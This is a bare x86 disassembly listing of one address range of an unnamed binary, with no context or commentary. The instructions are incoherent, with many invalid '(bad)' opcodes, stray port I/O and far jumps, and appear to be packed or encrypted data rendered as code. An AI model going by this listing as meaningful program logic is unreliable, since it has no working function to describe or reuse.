  40e7c0:	pop    edx
  40e7c1:	cwde   
  40e7c2:	(bad)  
  40e7c3:	pushf  
  40e7c4:	fist   DWORD PTR [esi+edi*2-0x3a36c8dd]
  40e7cb:	adc    cl,ah
  40e7cd:	in     al,0xc
  40e7cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7d0:	and    DWORD PTR [ebx-0x12],esi
  40e7d3:	jg     0x40e7c3
  40e7d5:	fisubr WORD PTR [ebp+ecx*2-0x63]
  40e7d9:	iret   
  40e7da:	dec    BYTE PTR [eax+0x6e]
  40e7dd:	je     0x40e859
  40e7df:	repz mov ah,0x1b
  40e7e2:	je     0x40e76b
  40e7e4:	ror    DWORD PTR [edx-0x1b],0x5e
  40e7e8:	clc    
  40e7e9:	mov    dl,BYTE PTR [ebx-0x5e]
  40e7ec:	xor    eax,0x632bd1fd
  40e7f1:	sbb    BYTE PTR [eax+0x8d2c351],bh
  40e7f7:	int    0x13
  40e7f9:	iret   
  40e7fa:	sub    eax,0x659b476e
  40e7ff:	call   0xc6db687c
  40e804:	jmp    0x40e7ae
  40e806:	xchg   edi,eax
  40e807:	jle    0x40e7b5
  40e809:	xchg   BYTE PTR [ebx+0x2311e650],al
  40e80f:	add    ebx,edi
  40e811:	dec    esi
  40e812:	jp     0x40e7d0
  40e814:	nop
  40e815:	inc    esp
  40e816:	sub    al,0xa1
  40e818:	pop    edx
  40e819:	in     al,0xb4
  40e81b:	loopne 0x40e896
  40e81d:	mov    ds:0x5bcfd475,eax
  40e822:	imul   ecx,DWORD PTR [ebp-0x6a],0xa89aa6d2
  40e829:	inc    ebp
  40e82a:	call   0xe73c:0x54251f38
  40e831:	adc    dl,BYTE PTR [edx]
  40e833:	icebp  
  40e834:	jne    0x40e84b
  40e836:	mov    ah,0x6
  40e838:	sub    cl,BYTE PTR [ebx]
  40e83a:	sub    ecx,DWORD PTR [ecx]
  40e83c:	push   edx
  40e83d:	sub    eax,0xad0dd17a
  40e842:	xor    cl,bh
  40e844:	or     eax,0x99143c2d
  40e849:	aam    0x9c
  40e84b:	fs pop edx
  40e84d:	repnz cmp BYTE PTR [ecx+0x78],al
  40e851:	retf   0x13a5
  40e854:	pop    ebx
  40e855:	and    dl,BYTE PTR [esi+0xfc2166b]
  40e85b:	outs   dx,DWORD PTR ds:[esi]
  40e85c:	jb     0x40e859
  40e85e:	jae    0x40e848
  40e860:	out    0x8f,al
  40e862:	mov    bh,BYTE PTR [esi]
  40e864:	mov    ah,0x58
  40e866:	js     0x40e84a
  40e868:	loope  0x40e8ab
  40e86a:	bound  ecx,QWORD PTR cs:[ebp-0x2d]
  40e86e:	call   0x52051388
  40e873:	inc    esi
  40e874:	xor    esi,DWORD PTR [ecx+0x31]
  40e877:	(bad)  
  40e879:	pop    esi
  40e87a:	xchg   ecx,eax
  40e87b:	fisubr WORD PTR [ebp+0x1f59706f]
  40e881:	lods   eax,DWORD PTR ds:[esi]
  40e882:	adc    eax,0x6536c8b
  40e887:	stc    
  40e888:	lea    edx,[ecx-0x5ac97547]
  40e88e:	pop    ds
  40e88f:	adc    al,0x60
  40e891:	sahf   
  40e892:	ja     0x40e842
  40e894:	mov    al,0x25
  40e896:	mov    ds:0x9e001d26,al
  40e89b:	jecxz  0x40e8dd
  40e89d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e89e:	div    dh
  40e8a0:	jae    0x40e858
  40e8a2:	dec    ebx
  40e8a3:	inc    edx
  40e8a4:	dec    esp
  40e8a5:	ret    0xf5a8
  40e8a8:	pop    ecx
  40e8a9:	mov    al,ds:0xd5358d6e
  40e8ae:	loop   0x40e8f0
  40e8b0:	xor    ch,BYTE PTR [ebx-0x44]
  40e8b3:	and    al,0xe
  40e8b5:	xchg   BYTE PTR [edi-0xf216d40],ah
  40e8bb:	xchg   edx,eax
  40e8bc:	stos   DWORD PTR es:[edi],eax
  40e8bd:	dec    ebp
  40e8be:	cli    
  40e8bf:	pop    ss
  40e8c0:	push   0xffffffbc
  40e8c2:	out    0xb3,al
  40e8c4:	xor    al,0x94
  40e8c6:	or     DWORD PTR [ebp-0x35f70bc],esp
  40e8cc:	mov    es,WORD PTR [edi-0x2a]
  40e8cf:	repnz rcl BYTE PTR [ebp+0x46],0x85
  40e8d4:	cwde   
  40e8d5:	sub    esi,DWORD PTR [ecx-0x7a]
  40e8d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8d9:	sbb    bl,BYTE PTR [ebx-0x55248f2a]
  40e8df:	xchg   ecx,eax
  40e8e0:	push   ecx
  40e8e1:	add    bl,bl
  40e8e3:	ss jecxz 0x40e8a1
  40e8e6:	bound  eax,QWORD PTR [ebx-0x5f]
  40e8e9:	jb     0x40e87e
  40e8eb:	ds scas eax,DWORD PTR es:[edi]
  40e8ed:	scas   eax,DWORD PTR es:[edi]
  40e8ee:	add    cl,dh
  40e8f0:	jge    0x40e943
  40e8f2:	mov    ebp,DWORD PTR [eax-0x47329f83]
  40e8f8:	fild   DWORD PTR [eax]
	...
  40e93e:	add    BYTE PTR [eax+0x34],ch
  40e941:	fs mov esi,0xf6fafe7c
  40e947:	mov    bl,0x9d
  40e949:	aam    0xd4
  40e94b:	fnstcw WORD PTR [ebp+esi*8-0x49]
  40e94f:	(bad)
  40e952:	add    BYTE PTR [edx],ah
  40e954:	pop    es
  40e955:	add    BYTE PTR [eax],al
  40e957:	inc    esp
  40e958:	dec    esi
  40e959:	lods   eax,DWORD PTR ds:[esi]
  40e95a:	je     0x40e93d
  40e95c:	jbe    0x40e996
  40e95e:	sbb    eax,0xbe5de5f2
  40e963:	dec    ebx
  40e964:	(bad)  
  40e966:	jae    0x40e99b
  40e968:	push   ecx
  40e969:	mov    ds:0x94476e60,eax
  40e96e:	or     DWORD PTR [esi-0x399499d0],esi
  40e974:	ucomiss xmm7,DWORD PTR [esi+esi*2]
  40e978:	xchg   ebp,eax
  40e979:	mov    ch,0xd8
  40e97b:	into   
  40e97c:	and    ch,BYTE PTR [ebp-0x192ff31f]
  40e982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e983:	retf   0x9df2
  40e986:	sbb    ah,BYTE PTR [ebx]
  40e988:	cmp    eax,DWORD PTR fs:0x149d15e2
  40e98f:	and    eax,0x4fac5521
  40e994:	or     dh,bh
  40e996:	loop   0x40e927
  40e998:	(bad)  [ebp+0x41b8d553]
  40e99e:	sbb    DWORD PTR [ebx+eax*2-0x52],eax
  40e9a2:	div    ecx
  40e9a4:	push   es
  40e9a5:	lods   eax,DWORD PTR ds:[esi]
  40e9a6:	add    ah,ch
  40e9a8:	mov    ds:0x5be4ff05,eax
  40e9ad:	xor    al,0x5
  40e9af:	xchg   ecx,eax
  40e9b0:	dec    esi
  40e9b1:	ss into 
  40e9b3:	or     ebx,esp
  40e9b5:	int3   
  40e9b6:	mov    al,ds:0xc232043d
  40e9bb:	cld    
  40e9bc:	jp     0x40ea00
  40e9be:	jecxz  0x40e9be
  40e9c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9c1:	pushf  
  40e9c2:	ret    
  40e9c3:	sbb    al,0x8a
  40e9c5:	push   ebx
  40e9c6:	jg     0x40e969
  40e9c8:	push   cs
  40e9c9:	imul   bl
  40e9cb:	xchg   esp,eax
  40e9cc:	out    0x5a,al
  40e9ce:	mov    ecx,0x2fd9066
  40e9d3:	sub    DWORD PTR [edi],ebx
  40e9d5:	(bad)  
  40e9d6:	aad    0x7b
  40e9d8:	lea    edx,[ebp+0x7f]
  40e9db:	aas    
  40e9dc:	test   dh,al
  40e9de:	lods   al,BYTE PTR ds:[esi]
  40e9df:	dec    edx
  40e9e0:	les    ecx,FWORD PTR [ebx+ebp*1+0x6f]
  40e9e4:	xor    BYTE PTR ds:0xf41e6d11,cl
  40e9ea:	jge    0x40e994
  40e9ec:	cli    
  40e9ed:	adc    BYTE PTR [ebp+0x138dc91e],bl
  40e9f3:	and    eax,0xa27ed26b
  40e9f8:	pop    ecx
  40e9f9:	and    bl,cl
  40e9fb:	cs inc edx
  40e9fd:	in     al,0xb2
  40e9ff:	(bad)  
  40ea01:	cli    
  40ea02:	int3   
  40ea03:	and    dh,BYTE PTR [edi]
  40ea05:	mov    ah,0x9d
  40ea07:	xlat   BYTE PTR ds:[ebx]
  40ea08:	sbb    BYTE PTR [esi],cl
  40ea0a:	mov    dl,0x16
  40ea0c:	jl     0x40ea5d
  40ea0e:	shl    dh,0x49
  40ea11:	or     ah,BYTE PTR [ecx-0x37ebe6d5]
  40ea17:	cld    
  40ea18:	add    ecx,DWORD PTR [edx+ebp*2-0x25]
  40ea1c:	inc    eax
  40ea1d:	ret    0xe051
  40ea20:	sbb    DWORD PTR [ecx-0x1db16faf],ebp
  40ea26:	mov    cl,0xf4
  40ea28:	push   eax
  40ea29:	not    BYTE PTR [esi]
  40ea2b:	sbb    bl,BYTE PTR [edx]
  40ea2d:	push   0x3c
  40ea2f:	lock retf 0x69a0
  40ea33:	xchg   ebx,eax
  40ea34:	or     DWORD PTR [esi+edi*8-0x17],ecx
  40ea38:	or     ebx,ecx
  40ea3a:	pop    esi
  40ea3b:	imul   ebp,ecx,0x37
  40ea3e:	inc    ecx
  40ea3f:	in     al,dx
  40ea40:	cmp    DWORD PTR [edi+0x58],0xffffffc8
  40ea44:	xchg   edi,eax
  40ea45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea46:	ret    0x5735
  40ea49:	test   bh,bl
  40ea4b:	push   edx
  40ea4c:	push   ebx
  40ea4d:	jno    0x40ea5b
  40ea4f:	dec    edi
  40ea50:	push   eax
  40ea51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea52:	push   ecx
  40ea53:	cld    
  40ea54:	and    al,BYTE PTR [esi]
  40ea56:	xlat   BYTE PTR ds:[ebx]
  40ea57:	mov    dh,0xcb
  40ea59:	fcmovu st,st(0)
  40ea5b:	sbb    ebp,edi
  40ea5d:	ds es or esi,ebp
  40ea61:	add    cl,ah
  40ea63:	mov    al,gs:0x8624d7eb
  40ea69:	(bad)
  40ea6c:	xor    BYTE PTR [ebx-0x76c6212],bl
  40ea72:	aam    0x20
  40ea74:	push   cs
  40ea75:	add    DWORD PTR [esi-0x10],eax
  40ea78:	outs   dx,BYTE PTR ds:[si]
  40ea7a:	pop    ebp
  40ea7b:	loopne 0x40eae6
  40ea7d:	or     BYTE PTR [esi+edx*2+0x2c],al
  40ea81:	adc    ah,ch
  40ea83:	mov    ebp,0xa50cbba8
  40ea88:	and    esp,esp
  40ea8a:	shr    DWORD PTR [edi-0x3e24e4db],cl
  40ea90:	pop    es
  40ea91:	dec    esp
  40ea92:	dec    ebx
  40ea93:	pop    edi
  40ea94:	mov    esi,0x911c2367
  40ea99:	iret   
  40ea9a:	js     0x40ea3d
  40ea9c:	cmc    
  40ea9d:	or     eax,0xd92d02d7
  40eaa2:	hlt    
  40eaa3:	cmp    ch,dh
  40eaa5:	dec    BYTE PTR [edi]
  40eaa7:	cmp    al,0x5b
  40eaa9:	sub    al,dh
  40eaab:	pop    edx
  40eaac:	push   ecx
  40eaad:	and    eax,0x8d0feb02
  40eab2:	dec    ebp
  40eab3:	mov    ds:0x9704b7a,al
  40eab8:	or     DWORD PTR [ecx+0xd],ebp
  40eabb:	sbb    dh,BYTE PTR [ebx]
  40eabd:	add    ebp,eax
  40eabf:	and    eax,0xe646f996
  40eac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eac5:	xchg   ecx,eax
  40eac6:	dec    ecx
  40eac7:	adc    eax,0x8cdabc1d
  40eacc:	(bad)
  40eacf:	lods   eax,DWORD PTR ds:[esi]
  40ead0:	in     al,dx
  40ead1:	in     al,dx
  40ead2:	jecxz  0x40eae1
  40ead4:	lods   al,BYTE PTR ds:[esi]
  40ead5:	and    al,0x1b
  40ead7:	popa   
  40ead8:	and    BYTE PTR [esi+edi*1],ah
  40eadb:	les    ecx,FWORD PTR [edx]
  40eadd:	dec    ecx
  40eade:	js     0x40eb36
  40eae0:	mov    esi,DWORD PTR [ebx-0x5ed711ab]
  40eae6:	aam    0x3
  40eae8:	stos   BYTE PTR es:[edi],al
  40eae9:	daa    
  40eaea:	mov    ebp,0xfe339e5
  40eaef:	sub    BYTE PTR [edx-0x60],dh
  40eaf2:	xchg   DWORD PTR [esi+0x1f8df844],esp
  40eaf8:	mov    fs,ecx
  40eafa:	and    al,0x93
  40eafc:	mov    al,ds:0x25b0b303
  40eb01:	pop    esi
  40eb02:	pop    ecx
  40eb03:	cmp    bl,BYTE PTR [edi*4-0x7daded75]
  40eb0a:	xchg   edi,eax
  40eb0b:	mov    eax,0xb5d7cb5a
  40eb10:	sti    
  40eb11:	data16 xlat BYTE PTR ds:[ebx]
  40eb13:	js     0x40eb7a
  40eb15:	in     al,dx
  40eb16:	test   eax,0xd38ebcb1
  40eb1b:	outs   dx,DWORD PTR ds:[esi]
  40eb1d:	pop    esp
  40eb1e:	xor    BYTE PTR [ebp-0x46],bh
  40eb21:	not    BYTE PTR [ebx+esi*8]
  40eb24:	hlt    
  40eb25:	ins    BYTE PTR es:[edi],dx
  40eb26:	outs   dx,DWORD PTR ds:[esi]
  40eb27:	frstor [edi]
  40eb29:	or     al,cl
  40eb2b:	add    al,0x17
  40eb2d:	mov    al,BYTE PTR [esi+0x47]
  40eb30:	jbe    0x40eb80
  40eb32:	jecxz  0x40eacb
  40eb34:	xor    al,0x69
  40eb36:	scas   eax,DWORD PTR es:[edi]
  40eb37:	call   0x2cb3:0x316495f5
  40eb3e:	iret   
  40eb3f:	or     BYTE PTR [eax+0x3f],0x60
  40eb43:	test   BYTE PTR ds:0xafa03f77,0xa5
  40eb4a:	cdq    
  40eb4b:	xchg   esp,eax
  40eb4c:	push   0x921a411e
  40eb51:	jnp    0x40eb99
  40eb53:	mov    DWORD PTR [eax-0x3b5ec0f2],esp
  40eb59:	cmp    ebx,esp
  40eb5b:	mov    esp,gs
  40eb5d:	cmp    eax,0xd4e8ddaa
  40eb62:	xchg   ebx,eax
  40eb63:	xor    BYTE PTR [edx+0x4e],al
  40eb66:	push   ebp
  40eb67:	call   0xe0aa:0xae1a3be7
  40eb6e:	test   eax,0xe9464ff3
  40eb73:	xchg   BYTE PTR [esi-0xda4972a],bh
  40eb79:	cmp    DWORD PTR [edx+0x1d],0x41
  40eb7d:	addr16 mov cl,0xfc
  40eb80:	sub    esp,DWORD PTR [ebx-0x6aae8a97]
  40eb86:	in     eax,0x4b
  40eb88:	and    ecx,DWORD PTR [ebp-0x153002a9]
  40eb8e:	mov    ecx,0x11aeb476
  40eb93:	popa   
  40eb94:	jle    0x40ec01
  40eb96:	repz retf 0x3b44
  40eb9a:	dec    edx
  40eb9b:	sbb    bh,dh
  40eb9d:	aas    
  40eb9e:	stos   DWORD PTR es:[edi],eax
  40eb9f:	push   0x342316f5
  40eba4:	int3   
  40eba5:	cmp    bl,bl
  40eba7:	or     DWORD PTR [edi+eax*8-0xf],0x7f0650be
  40ebaf:	cmp    BYTE PTR [edi],cl
  40ebb1:	sub    DWORD PTR [ecx],eax
  40ebb3:	dec    esi
  40ebb4:	jmp    0x6366:0x17671dc5
  40ebbb:	push   ds
  40ebbc:	rol    DWORD PTR [edi],1
  40ebbe:	loope  0x40ebf1
  40ebc0:	scas   al,BYTE PTR es:[edi]
  40ebc1:	jp     0x40ebab
  40ebc3:	sahf   
  40ebc4:	inc    eax
  40ebc5:	inc    esi
  40ebc6:	stos   BYTE PTR es:[edi],al
  40ebc7:	mov    esi,0xf2790de3
  40ebcc:	pop    ds
  40ebcd:	pop    ebx
  40ebce:	cwde   
  40ebcf:	mov    cl,BYTE PTR [ebx+0x186a1db7]
  40ebd5:	add    edi,DWORD PTR [ecx]
  40ebd7:	inc    edx
  40ebd8:	cwde   
  40ebd9:	cmp    ebp,DWORD PTR [edx]
  40ebdb:	inc    edi
  40ebdc:	popf   
  40ebdd:	mov    ch,0x53
  40ebdf:	cmp    al,0x5a
  40ebe1:	xor    DWORD PTR [esi],edi
  40ebe3:	es mov ebx,0x6ae4ebd8
  40ebe9:	cmp    eax,0xb6f9bcb
  40ebee:	nop
  40ebef:	jge    0x40ebe5
  40ebf1:	add    ecx,DWORD PTR [ebp-0x26c12d65]
  40ebf7:	daa    
  40ebf8:	(bad)  
  40ebf9:	xor    esi,esi
  40ebfb:	mov    al,cl
  40ebfd:	mov    ebp,DWORD PTR [eax]
  40ebff:	pusha  
  40ec00:	pop    edi
  40ec01:	xchg   ebx,eax
  40ec02:	in     eax,dx
  40ec03:	lods   eax,DWORD PTR ds:[esi]
  40ec04:	sbb    eax,esi
  40ec06:	mov    al,ds:0xf0a5908b
  40ec0b:	mov    eax,0xeff02e75
  40ec10:	(bad)  
  40ec11:	aam    0x39
  40ec13:	mov    edi,0xc43f314e
  40ec18:	fucomi st,st(3)
  40ec1a:	sub    al,0xb9
  40ec1c:	not    BYTE PTR [ecx+0x35]
  40ec1f:	cdq    
  40ec20:	xor    BYTE PTR [ebx+0x47478645],0xa
  40ec27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec28:	push   edx
  40ec29:	jmp    0x40ec3e
  40ec2b:	ret    
  40ec2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec2d:	sub    DWORD PTR es:[ecx+0x6d],ebp
  40ec31:	int3   
  40ec32:	neg    BYTE PTR [ecx]
  40ec34:	stos   DWORD PTR es:[edi],eax
  40ec35:	xor    DWORD PTR [edx+0x12612fc8],esi
  40ec3b:	jle    0x40ec5f
  40ec3d:	jbe    0x40ec28
  40ec3f:	(bad)  
  40ec40:	repnz std 
  40ec42:	inc    eax
  40ec43:	setp   BYTE PTR [esi]
  40ec46:	jnp    0x40ebcc
  40ec48:	bound  ecx,QWORD PTR [esi-0x2d05543]
  40ec4e:	cdq    
  40ec4f:	jbe    0x40ec2e
  40ec51:	sbb    BYTE PTR [edx],ch
  40ec53:	push   esp
  40ec54:	cdq    
  40ec55:	xchg   ecx,eax
  40ec56:	push   edi
  40ec57:	repnz rcr DWORD PTR [ecx+0x48],1
  40ec5b:	pop    edx
  40ec5c:	scas   al,BYTE PTR es:[edi]
  40ec5d:	inc    BYTE PTR [esi+ecx*2+0x1912eb28]
  40ec64:	pop    ds
  40ec65:	inc    ecx
  40ec66:	mov    eax,ds:0x958072c5
  40ec6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec6c:	sub    edx,DWORD PTR [edx-0x5e]
  40ec6f:	xchg   esi,eax
  40ec70:	xchg   DWORD PTR [esi+0x7e],edi
  40ec73:	mov    edx,0x3acd2d6
  40ec78:	(bad)  
  40ec7a:	inc    edi
  40ec7b:	and    DWORD PTR [eax+eax*8-0x78],ebx
  40ec7f:	icebp  
  40ec80:	dec    ebx
  40ec81:	pushw  0x58
  40ec84:	cdq    
  40ec85:	lea    esi,[edi+eax*1+0x17c1c153]
  40ec8c:	ret    0xf74b
  40ec8f:	outs   dx,BYTE PTR ds:[esi]
  40ec91:	mov    edx,0xce610de2
  40ec96:	mov    DWORD PTR [edi+0x184f1bd8],ecx
  40ec9c:	in     al,0xa0
  40ec9e:	push   es
  40ec9f:	cld    
  40eca0:	or     eax,0xba9079f3
  40eca5:	mov    DWORD PTR [ecx-0x6411d520],edi
  40ecab:	sbb    BYTE PTR ds:0x942d7970,ch
  40ecb1:	pop    esi
  40ecb2:	push   ds
  40ecb3:	idiv   BYTE PTR [ebp-0x71]
  40ecb6:	xchg   ebx,eax
  40ecb7:	sub    DWORD PTR [edi],ecx
  40ecb9:	inc    eax
  40ecba:	aas    
  40ecbb:	sub    al,0x79
  40ecbd:	xchg   BYTE PTR [esi+0x18fe9469],bh
  40ecc3:	push   cs
  40ecc4:	mov    eax,ds:0x6b3ca2d8
  40ecc9:	call   0xf997:0xe4cffd41
  40ecd0:	inc    edi
  40ecd1:	in     eax,0xe0
  40ecd3:	mov    dl,0xf3
  40ecd5:	out    0xc5,al
  40ecd7:	fwait
  40ecd8:	in     eax,0xfd
  40ecda:	push   edi
  40ecdb:	jbe    0x40ecdf
  40ecdd:	aam    0xd0
  40ecdf:	mov    ds:0xf11618ed,eax
  40ece4:	push   ds
  40ece5:	div    BYTE PTR [edx]
  40ece7:	cmp    edx,DWORD PTR [edx+edi*4-0x7d]
  40eceb:	cmp    ch,BYTE PTR [edx-0x1]
  40ecee:	fsubr  QWORD PTR [ebp-0x4a08c410]
  40ecf4:	fld    TBYTE PTR [ecx-0x4801a939]
  40ecfa:	xchg   edx,eax
  40ecfb:	mov    bh,0x92
  40ecfd:	(bad)  
  40ecfe:	repnz outs dx,BYTE PTR ds:[esi]
  40ed00:	push   edi
  40ed01:	xchg   esi,eax
  40ed02:	dec    ebp
  40ed03:	arpl   WORD PTR [edx],si
  40ed05:	mov    ebx,DWORD PTR [esi+0x2c3ff2e5]
  40ed0b:	test   al,0x4e
  40ed0d:	pop    edx
  40ed0e:	sbb    bh,dh
  40ed10:	sti    
  40ed11:	xor    al,0xe8
  40ed13:	scas   eax,DWORD PTR es:[edi]
  40ed14:	es dec esi
  40ed16:	imul   ecx,DWORD PTR [esi+0x50],0x7a968078
  40ed1d:	push   0x7b
  40ed1f:	cli    
  40ed20:	in     al,0xac
  40ed22:	add    ebx,edx
  40ed24:	pusha  
  40ed25:	std    
  40ed26:	jmp    0x40ed01
  40ed28:	mov    cl,0x7d
  40ed2a:	addr16 je 0x40ed6a
  40ed2d:	jle    0x40ed29
  40ed2f:	cmc    
  40ed30:	icebp  
  40ed31:	(bad)  
  40ed32:	push   ebx
  40ed33:	test   BYTE PTR [edi+0x56],ah
  40ed36:	sub    esp,esi
  40ed38:	add    ebx,eax
  40ed3a:	add    DWORD PTR [ebx],esi
  40ed3c:	retf   0xe78e
  40ed3f:	jp     0x40ed4c
  40ed41:	das    
  40ed42:	fucomi st,st(5)
  40ed44:	mov    ch,ah
  40ed46:	cld    
  40ed47:	outs   dx,BYTE PTR ds:[esi]
  40ed48:	mov    esi,0xdfb064fb
  40ed4d:	cmp    cl,0x48
  40ed50:	bound  eax,QWORD PTR [edi+0x43082854]
  40ed56:	in     al,dx
  40ed57:	aam    0xad
  40ed59:	and    ebx,ecx
  40ed5b:	popa   
  40ed5c:	sbb    DWORD PTR [esi],ecx
  40ed5e:	js     0x40ed56
  40ed60:	mov    ebp,cs
  40ed62:	mov    ebp,0xc98086fc
  40ed67:	mov    ch,0x19
  40ed69:	and    eax,0xf5216150
  40ed6e:	cld    
  40ed6f:	lds    ebx,FWORD PTR [edx-0x543d1a99]
  40ed75:	cmp    eax,0x8b0b8150
  40ed7a:	push   cs
  40ed7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed7c:	cwde   
  40ed7d:	dec    edx
  40ed7e:	dec    esp
  40ed7f:	outs   dx,BYTE PTR ds:[esi]
  40ed80:	dec    esi
  40ed81:	pusha  
  40ed82:	(bad)
  40ed85:	ror    DWORD PTR [edx+0x2d],1
  40ed88:	sub    ah,BYTE PTR [ecx+0x39]
  40ed8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed8c:	inc    ebp
  40ed8d:	(bad)  
  40ed8e:	mov    eax,0xe6a7cf17
  40ed93:	add    eax,0xad204614
  40ed98:	cmp    al,0x9a
  40ed9a:	pop    edi
  40ed9b:	iret   
  40ed9c:	inc    esp
  40ed9d:	ds mov edi,0xa0b0787d
  40eda3:	mov    DWORD PTR [ecx],0xa59b40dc
  40eda9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edaa:	out    0xf4,al
  40edac:	scas   al,BYTE PTR es:[edi]
  40edad:	mov    eax,ds:0xfd9bb432
  40edb2:	stc    
  40edb3:	mov    WORD PTR [esi],?
  40edb5:	retf   
  40edb6:	xor    eax,0x686128c2
  40edbb:	pop    edi
  40edbc:	daa    
  40edbd:	add    eax,0xceb69ef6
  40edc2:	ror    WORD PTR [di+0x333],cl
  40edc8:	icebp  
  40edc9:	dec    ebx
  40edca:	xor    BYTE PTR [ebx],dl
  40edcc:	prefetch BYTE PTR [edx]
  40edcf:	and    ah,dh
  40edd1:	xor    BYTE PTR [ebp-0x16],cl
  40edd4:	xor    ah,BYTE PTR [edx-0xc772876]
  40edda:	imul   eax,esi,0x65
  40eddd:	jl     0x40ee34
  40eddf:	(bad)  
  40ede0:	(bad)  
  40ede1:	pusha  
  40ede2:	or     DWORD PTR [esi+0x4d8103bc],0xae7cf18
  40edec:	xor    ch,dh
  40edee:	es pop ds
  40edf0:	jmp    0x2894:0x5b867542
  40edf7:	ds inc ecx
  40edf9:	aaa    
  40edfa:	sbb    dl,BYTE PTR [esi]
  40edfc:	js     0x40ed7f
  40edfe:	rcl    BYTE PTR [ebx+0x52e7dd0e],1
  40ee04:	pop    edi
  40ee05:	ficom  DWORD PTR [eax+0x2e]
  40ee08:	jl     0x40ee30
  40ee0a:	push   0xffffffa4
  40ee0c:	or     BYTE PTR [edi],0xe6
  40ee0f:	sub    eax,0x6d041f67
  40ee14:	fadd   DWORD PTR ds:0xc2553e41
  40ee1a:	push   es
  40ee1b:	or     DWORD PTR [edi+0xc],0x3464607a
  40ee22:	sbb    al,0xd3
  40ee24:	push   es
  40ee25:	sahf   
  40ee26:	mov    cl,0xa6
  40ee28:	adc    al,0x35
  40ee2a:	lods   eax,DWORD PTR ds:[esi]
  40ee2b:	test   DWORD PTR [ecx+0x1f],eax
  40ee2e:	pop    ds
  40ee2f:	inc    eax
  40ee30:	ins    DWORD PTR es:[edi],dx
  40ee31:	fnstenv [eax]
  40ee33:	sub    DWORD PTR [edi+esi*4+0x387a9009],ebp
  40ee3a:	pop    esi
  40ee3b:	dec    ebp
  40ee3c:	fsub   st(0),st
  40ee3e:	das    
  40ee3f:	add    ah,BYTE PTR [esi-0x533a4907]
  40ee45:	add    al,BYTE PTR [esi]
  40ee47:	gs loope 0x40edd0
  40ee4a:	xor    BYTE PTR [edx+0x1f14d086],0x16
  40ee51:	sub    eax,0xb774b879
  40ee56:	inc    eax
  40ee57:	repz inc ebx
  40ee59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee5a:	or     esp,ecx
  40ee5c:	mov    bl,BYTE PTR [ebp+0x77]
  40ee5f:	retf   0x9b35
  40ee62:	dec    esi
  40ee63:	add    esi,DWORD PTR [ebp-0x15]
  40ee66:	adc    BYTE PTR [esi-0x7d1c52d7],dh
  40ee6c:	rcr    DWORD PTR [ebx],0x88
  40ee6f:	aas    
  40ee70:	cmp    DWORD PTR [ebx],0xc47fc79
  40ee76:	mov    edi,0x438c6f09
  40ee7b:	xchg   DWORD PTR [edi-0x15],ebp
  40ee7e:	push   ebx
  40ee7f:	loope  0x40ee09
  40ee81:	dec    ebx
  40ee82:	jbe    0x40ee51
  40ee84:	adc    al,0xc2
  40ee86:	out    0xa0,al
  40ee88:	retf   
  40ee89:	dec    eax
  40ee8a:	jnp    0x40ee27
  40ee8c:	mov    ch,0xc9
  40ee8e:	push   0xfffffffb
  40ee90:	jl     0x40ee92
  40ee92:	and    BYTE PTR ds:[edi+0x73],dh
  40ee96:	stc    
  40ee97:	mov    BYTE PTR ds:0xd3a9695d,al
  40ee9d:	shr    DWORD PTR [ebp+0x5a],1
  40eea0:	or     esp,DWORD PTR [eax-0x1c]
  40eea3:	aad    0xa4
  40eea5:	inc    esp
  40eea6:	jge    0x40eebd
  40eea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eea9:	out    0x49,eax
  40eeab:	dec    ecx
  40eeac:	cmp    dl,bh
  40eeae:	je     0x40ef26
  40eeb0:	pop    esi
  40eeb1:	push   esp
  40eeb2:	xchg   edi,eax
  40eeb3:	jno    0x40eeb8
  40eeb5:	pop    es
  40eeb6:	add    eax,0xa2c496db
  40eebb:	mov    bh,0x6d
  40eebd:	xchg   DWORD PTR [ebx+esi*8+0x48],esp
  40eec1:	mov    ch,BYTE PTR [ebx-0x3d]
  40eec4:	or     al,0x1d
  40eec6:	cmp    eax,0xf0754296
  40eecb:	std    
  40eecc:	mov    ebp,0x84e4a74d
  40eed1:	imul   ebx,DWORD PTR [eax+0x53b06679],0x3
  40eed8:	fild   DWORD PTR [esi+ecx*8]
  40eedb:	mov    ecx,DWORD PTR [edx+ecx*1]
  40eede:	pop    eax
  40eedf:	mov    ebx,DWORD PTR [ecx+esi*1+0x602751d2]
  40eee6:	mov    gs,ebx
  40eee8:	fld    QWORD PTR [esi-0x9]
  40eeeb:	adc    ecx,DWORD PTR [esi]
  40eeed:	and    BYTE PTR [esi+0x19],al
  40eef0:	adc    ecx,DWORD PTR [ebp-0x69352489]
  40eef6:	xchg   ecx,eax
  40eef7:	in     al,0xcf
  40eef9:	sahf   
  40eefa:	mov    ebp,0xa2421e1a
  40eeff:	ins    DWORD PTR es:[edi],dx
  40ef00:	sbb    bl,dh
  40ef02:	in     al,dx
  40ef03:	add    dh,BYTE PTR [ebx+0x7d134d]
  40ef09:	ja     0x40ef5e
  40ef0b:	adc    eax,0xb92596a0
  40ef10:	jge    0x40ef35
  40ef12:	xlat   BYTE PTR ds:[ebx]
  40ef13:	xlat   BYTE PTR ds:[ebx]
  40ef14:	ret    
  40ef15:	test   eax,0xf3a4d657
  40ef1a:	add    al,0xe5
  40ef1c:	sahf   
  40ef1d:	dec    edi
  40ef1e:	xor    eax,0x8c3d87d2
  40ef23:	jnp    0x40eef9
  40ef25:	mov    ecx,0x174dc4ea
  40ef2a:	(bad)  
  40ef2c:	xchg   ecx,eax
  40ef2d:	mov    bh,0x75
  40ef2f:	sbb    esi,DWORD PTR [edx-0x5dfe3a19]
